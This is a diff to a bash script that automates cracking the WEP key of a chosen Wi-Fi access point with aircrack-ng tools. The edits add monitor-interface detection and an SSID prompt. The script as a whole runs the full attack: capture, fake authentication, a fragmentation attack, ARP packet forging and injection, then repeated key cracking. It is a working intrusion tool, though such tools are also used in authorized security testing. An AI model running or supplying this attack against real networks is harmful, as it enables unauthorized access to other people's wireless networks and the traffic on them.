@@ -37,6 +37,11 @@ airmon-ng start ${INTERFACE}
 iwconfig ${INTERFACE} # mon0
 
 #################################################################
+# Get the monitor interface name (assumed to be the last one    #
+#################################################################
+MON=`iwconfig 2>/dev/null | grep mon | tail -1 | awk '{ print $1; }'`
+
+#################################################################
 # GET INTERFACE MAC ADDRESS
 #################################################################
 MACADDRESS=`ifconfig ${INTERFACE} | grep ${INTERFACE} | tr -s ' ' | cut -d ' ' -f5 | cut -c 1-17`
@@ -51,7 +56,7 @@ if [ -z ${2} ] || [ -z ${3} ] ; then
 	echo "MESSAGE: Will now display all visible WEP networks"
 	echo "MESSAGE: Once you have identified the network you wish to target press Ctrl-C to exit"
 	read -p "MESSAGE: Press enter to view networks"
-	airodump-ng --encrypt WEP ${INTERFACE} # mon0
+	airodump-ng --encrypt WEP ${MON} # mon0
 
 	#################################################################
 	# USER INPUT DETAILS FROM AIRODUMP
@@ -62,8 +67,11 @@ if [ -z ${2} ] || [ -z ${3} ] ; then
 		read -e BSSID
 		echo -n "MESSAGE: Please enter the target channel here: "
 		read -e CHANNEL
+		echo -n "MESSAGE: Please enter the target SSID here: "
+		read -e SSID
 		echo "MESSAGE: Target BSSID            : ${BSSID}"
 		echo "MESSAGE: Target Channel          : ${CHANNEL}"
+		echo "MESSAGE: Target SSID             : ${SSID}"
 		echo "MESSAGE: Interface MAC Address   : ${MACADDRESS}"
 		echo -n "MESSAGE: Is this information correct? (y or n): "
 	  	read -e CONFIRM
@@ -79,23 +87,23 @@ fi
 # START AIRODUMP IN XTERM WINDOW
 #################################################################
 echo "MESSAGE: Starting packet capture - Ctrl-c to end it"
-xterm -title "Packet capture for cracking" -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w capture ${INTERFACE}" & AIRODUMPPID=$!
+xterm -title "Packet capture for cracking" -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w capture ${MON}" & AIRODUMPPID=$!
 sleep 2
 
 #################################################################
 # ASSOCIATE WITH AP & THEN PERFORM FRAGMENTATION ATTACK
 #################################################################
-xterm -title "Authentication process" -e "aireplay-ng -1 6000 -q 10 -a ${BSSID} -h ${MACADDRESS} ${INTERFACE}" & AIREPLAYAUTHPID=$!
-aireplay-ng -5 -b ${BSSID} -h ${MACADDRESS} ${INTERFACE}
-packetforge-ng -0 -a ${BSSID} -h ${MACADDRESS} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet ${INTERFACE}
-xterm -title "ARP injection" -e "aireplay-ng -2 -r arp-packet ${INTERFACE}" & AIREPLAYPID=$!
+xterm -title "Authentication process" -e "aireplay-ng -1 6000 -q 10 -e '${SSID}' -a ${BSSID} -h ${MACADDRESS} ${MON}" & AIREPLAYAUTHPID=$!
+aireplay-ng -5 -b ${BSSID} -h ${MACADDRESS} ${MON}
+packetforge-ng -0 -a ${BSSID} -h ${MACADDRESS} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet 
+xterm -title "ARP injection" -e "aireplay-ng -2 -r arp-packet ${MON}" & AIREPLAYPID=$!
 
 #################################################################
 # ATTEMPTING TO CRACK
 #################################################################
 while true
 do
-	aircrack-ng -n 128 -b ${BSSID} *.ivs
+	aircrack-ng -b ${BSSID} *.ivs
 	echo -n "MESSAGE: Did you get the key?: (y or no)"
   	read -e CONFIRM
  	case $CONFIRM in
@@ -111,6 +119,7 @@ done
 kill ${AIRODUMPPID}
 kill ${AIREPLAYPID}
 kill ${AIREPLAYAUTHPID}
+airmon-ng stop ${MON}
 airmon-ng stop ${INTERFACE}
 rm *.ivs *.cap *.xor
 exit 0
